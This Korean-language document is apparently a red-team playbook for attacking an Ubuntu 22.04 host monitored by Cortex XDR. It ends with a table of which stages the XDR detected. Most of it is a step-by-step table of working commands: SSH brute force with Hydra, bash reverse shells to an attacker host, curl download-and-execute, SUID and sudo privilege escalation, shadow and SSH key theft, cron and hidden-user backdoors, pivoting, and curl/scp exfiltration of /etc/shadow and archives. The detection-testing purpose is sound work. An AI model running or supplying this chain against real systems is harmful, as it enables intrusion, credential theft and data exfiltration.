# Ubuntu 공격 체인

> **환경**: Ubuntu 22.04 LTS · Cortex XDR 에이전트 설치  
> **목표**: 초기 접근 → 루트 권한 획득 → 후속 공격 6개 브랜치 실행

---

## 🔗 공격 흐름 (Kill Chain)

```
[RECON]
  Nmap 포트 스캔
       │
       ▼
[INIT ACCESS]
  SSH Bruteforce (Hydra)
       │
       ▼
[EXECUTION]
  Bash 리버스쉘 페이로드
       │
       ▼
[PRIV ESC]
  SUID 바이너리 악용 / sudo 미스컨픽
       │
  ┌────┴────┬────────┬────────┬────────┬────────┐
  ▼         ▼        ▼        ▼        ▼        ▼
[CRED]   [PERSIST] [LOLBin] [DATA]  [LATERAL] [EXFIL]
shadow   Cron백도어 find/cp  민감파일  내부망스캔 scp/curl
덤프     SSH Key   악용     수집      피벗팅    유출
```

---

## 📋 단계별 상세

### 1. 정찰 (Reconnaissance)
**MITRE**: T1595, T1046

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 1 | 포트 스캔 | `nmap -sV -p- <target>` | 열린 포트 목록 (22/ssh, 80/http 등) |
| 2 | 서비스 버전 열거 | `nmap -sV --script=banner <target>` | 서비스 배너, OS 버전 |
| 3 | SSH 버전 확인 | `nc <target> 22` | OpenSSH 버전 정보 |

---

### 2. 초기 접근 (Initial Access)
**MITRE**: T1110.001

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 4 | SSH 브루트포스 | `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>` | 유효 크레덴셜 획득 |
| 5 | SSH 로그인 | `ssh root@<target>` | 세션 수립 |

---

### 3. 실행 (Execution)
**MITRE**: T1059.004

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 6 | 리버스쉘 생성 | `bash -i >& /dev/tcp/<attacker>/4444 0>&1` | 리버스 쉘 연결 |
| 7 | 페이로드 다운로드 | `curl http://<attacker>/payload.sh -o /tmp/p.sh && chmod +x /tmp/p.sh && /tmp/p.sh` | /tmp/p.sh |
| 8 | Python 쉘 스폰 | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | 인터랙티브 TTY |

---

### 4. 권한 상승 (Privilege Escalation)
**MITRE**: T1548.001, T1548.003

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 9 | SUID 바이너리 탐색 | `find / -perm -4000 -type f 2>/dev/null` | SUID 바이너리 목록 |
| 10 | SUID bash 악용 | `/bin/bash -p` | root 쉘 |
| 11 | sudo 미스컨픽 확인 | `sudo -l` | sudo 허용 명령어 목록 |
| 12 | sudo find 악용 | `sudo find . -exec /bin/bash \; -quit` | root 쉘 |
| 13 | /etc/passwd 쓰기 | `openssl passwd -1 -salt xyz hacked` → passwd 추가 | 신규 root 계정 |

---

### 5-A. 자격증명 덤프 (Credential Access)
**MITRE**: T1003.008

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 14 | shadow 파일 덤프 | `cat /etc/shadow` | 해시된 패스워드 목록 |
| 15 | 오프라인 크래킹 | `john --wordlist=rockyou.txt shadow.txt` | 평문 패스워드 |
| 16 | SSH 키 수집 | `cat /root/.ssh/id_rsa` | RSA 개인키 |

---

### 5-B. 지속성 (Persistence)
**MITRE**: T1053.003, T1098.004

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 17 | Cron 백도어 | `echo "* * * * * bash -i >& /dev/tcp/<attacker>/5555 0>&1" >> /etc/crontab` | /etc/crontab 수정 |
| 18 | SSH 인가키 추가 | `echo "<attacker_pubkey>" >> /root/.ssh/authorized_keys` | authorized_keys |
| 19 | 히든 유저 생성 | `useradd -m -s /bin/bash -G sudo backdoor` | /etc/passwd, /etc/shadow |

---

### 5-C. LOLBin 악용 (Living off the Land)
**MITRE**: T1218

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 20 | find로 파일 복사 | `find /etc -name "*.conf" -exec cp {} /tmp/loot/ \;` | /tmp/loot/ |
| 21 | curl로 C2 통신 | `curl -d @/etc/shadow http://<attacker>/collect` | HTTP POST 로그 |
| 22 | tar로 아카이빙 | `tar czf /tmp/loot.tgz /etc /home /var/log` | /tmp/loot.tgz |

---

### 5-D. 데이터 수집 (Collection)
**MITRE**: T1005, T1083

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 23 | 민감파일 탐색 | `find / -name "*.pem" -o -name "*.key" -o -name "*.env" 2>/dev/null` | 인증서, 키파일 목록 |
| 24 | DB 자격증명 수집 | `grep -r "password" /var/www/ /opt/ 2>/dev/null` | 하드코딩된 크레덴셜 |
| 25 | 히스토리 수집 | `cat /root/.bash_history /home/*/.bash_history` | 명령어 히스토리 |

---

### 5-E. 내부망 이동 (Lateral Movement)
**MITRE**: T1021.004, T1018

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 26 | 내부망 스캔 | `nmap -sn 192.168.x.0/24` | 내부 호스트 목록 |
| 27 | SSH 피벗 | `ssh -i /root/.ssh/id_rsa user@<internal>` | 내부 서버 세션 |
| 28 | 포트 포워딩 | `ssh -L 8080:internal:80 root@<pivot>` | 터널링 |

---

### 5-F. 데이터 유출 (Exfiltration)
**MITRE**: T1048

| # | 기법 | 명령어 | 아티팩트 |
|---|------|--------|--------|
| 29 | SCP 유출 | `scp /tmp/loot.tgz attacker@<c2>:/exfil/` | 전송된 아카이브 |
| 30 | curl HTTP 업로드 | `curl -F "file=@/tmp/loot.tgz" http://<attacker>/upload` | HTTP 전송 로그 |

---

## 🛡️ XDR 탐지 결과

| 공격 단계 | XDR 탐지 여부 | 탐지 규칙 |
|---------|------------|---------|
| SSH 브루트포스 | ✅ 탐지 | Brute Force Attempt |
| SUID 악용 | ✅ 탐지 | Privilege Escalation |
| /etc/shadow 읽기 | ✅ 탐지 | Credential Access |
| Cron 백도어 | ✅ 탐지 | Persistence via Cron |
| 리버스쉘 | ✅ 탐지 | Suspicious Shell Spawning |
| LOLBin (find/curl) | ⚠️ 부분 탐지 | Suspicious Process |
